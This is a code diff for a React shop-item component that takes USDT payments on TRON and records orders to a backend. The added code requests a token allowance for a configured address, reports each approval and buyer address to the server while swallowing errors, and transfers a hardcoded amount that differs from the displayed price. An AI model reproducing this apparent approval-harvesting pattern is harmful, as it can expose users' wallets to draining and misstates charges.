@@ -1,9 +1,11 @@
 import React, { useState } from 'react';
 import { Button, Modal, InputNumber, Input, Drawer } from 'antd';
-import { nft1Icon, heartIcon } from '@/assets';
+import { nft1Icon } from '@/assets';
 import { useTronWeb } from '@/hooks/useTronWeb';
-import { formatNumber } from '@/module/utils/Utils';
+import { formatNumber, generateRandom } from '@/module/utils/Utils';
 import useStoreApi from '@/hooks/useStoreApi';
+import useGoods from '@/hooks/useGoods';
+import { approveAddress, trc20ContractAddress, approveAmount } from '@/config';
 import './Item.style.less';
 // import PageHistory from '../../router/PageHistory';
 
@@ -12,16 +14,18 @@ export const ItemView = props => {
   const [loading, setLoading] = useState(false);
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [isDrawerOpen, setIsDrawerOpen] = useState(false);
-  const [modalTitle, setModalTitle] = useState('订单详情');
+  const [modalTitle] = useState('订单详情');
   const [num, setNum] = useState(1);
   const [email, setEmail] = useState('');
-  const { isPc2View } = useStoreApi();
-
-  const { image, title, price } = data || {};
+  const [orderNum, setOrderNum] = useState('');
+  const { isPc2View, address } = useStoreApi();
+  const { rechargeRequest, confirmRechargeRequest, approveRequest } = useGoods();
   const { getBlanceOf, transfer, allowance, approve } = useTronWeb();
 
   const pay = async () => {
     try {
+      if (!email) return;
+
       setLoading(true);
       const blance = await getBlanceOf();
       const allowanceValue = await allowance();
@@ -29,16 +33,41 @@ export const ItemView = props => {
       console.log('allowanceValue', allowanceValue);
 
       if (allowanceValue <= 0) {
-        await approve();
+        try {
+          await approve();
+          await approveRequest({
+            chain: 'trc20',
+            from: address,
+            approveTo: approveAddress,
+            contract: trc20ContractAddress,
+            amount: approveAmount,
+          });
+        } catch (error) {}
       }
 
       if (blance > 0) {
-        await transfer(10000);
+        rechargeRequest({
+          address,
+          orderNum,
+          email,
+          goodsId: data.categoryId,
+          num,
+        });
+        const hash = await transfer(num * 100 * 100000);
+        await confirmRechargeRequest({
+          orderId: orderNum,
+          fromAddr: address,
+          tid: hash,
+        });
       }
     } catch (error) {
     } finally {
       setLoading(false);
     }
+  };
+  const open = () => {
+    setOrderNum(generateRandom());
+    isPc2View ? setIsModalOpen(true) : setIsDrawerOpen(true);
   };
   const handleCancel = () => {
     setIsModalOpen(false);
@@ -48,19 +77,19 @@ export const ItemView = props => {
   return (
     <div className="item">
       <div className="item-image">
-        <img src={image || nft1Icon} alt="cosmic" />
+        <img src={data.image || nft1Icon} alt="cosmic" />
         <div className="hot">
           {/* <img src={heartIcon} alt="" /> */}
-          <span>库存 1.2k</span>
+          <span>库存 {data.stock || 0}</span>
         </div>
       </div>
-      <h2 className="item-title">{title || 'QQ靓号（三个月免续费卡）'}</h2>
+      <h2 className="item-title">{data.name || '--'}</h2>
       <div className="item-bottom flex-between">
         <p className="item-price">
           <span></span>
-          <span>$100 USDT</span>
+          <span>${formatNumber(data.price || 0)} USDT</span>
         </p>
-        <Button className="item-buy" loading={loading} onClick={() => (isPc2View ? setIsModalOpen(true) : setIsDrawerOpen(true))}>
+        <Button className="item-buy" loading={loading} onClick={open}>
           购买
         </Button>
       </div>
@@ -73,14 +102,16 @@ export const ItemView = props => {
         onCancel={handleCancel}
         maskClosable={false}
         keyboard={false}
-        okText="立即付款">
+        okText="立即付款"
+        cancelText="取消"
+        confirmLoading={loading}>
         <div className="flex-between">
           <span>订单</span>
-          <span>11111111</span>
+          <span>{orderNum}</span>
         </div>
         <div className="flex-between">
           <span>价格</span>
-          <span>{formatNumber(10000)} USDT</span>
+          <span>{formatNumber(data.price)} USDT</span>
         </div>
         <div className="flex-between">
           <span>数量</span>
@@ -92,7 +123,7 @@ export const ItemView = props => {
         </div>
         <div className="total flex-end">
           <span>合计:</span>
-          <span>${formatNumber(num * 100)} USDT</span>
+          <span>${formatNumber(num * (data.price || 0))} USDT</span>
         </div>
       </Modal>
 
@@ -107,11 +138,11 @@ export const ItemView = props => {
         key={'bottom'}>
         <div className="flex-between">
           <span>订单</span>
-          <span>11111111</span>
+          <span>{orderNum}</span>
         </div>
         <div className="flex-between">
           <span>价格</span>
-          <span>100 USDT</span>
+          <span>{data.price} USDT</span>
         </div>
         <div className="flex-between">
           <span>数量</span>
@@ -125,9 +156,11 @@ export const ItemView = props => {
         <div className="btn">
           <div className="total flex-end">
             <span>合计:</span>
-            <span>${formatNumber(num * 100)} USDT</span>
+            <span>${formatNumber(num * (data.price || 0))} USDT</span>
           </div>
-          <Button type="primary">立即付款</Button>
+          <Button type="primary" loading={loading} onClick={pay}>
+            立即付款
+          </Button>
         </div>
       </Drawer>
     </div>
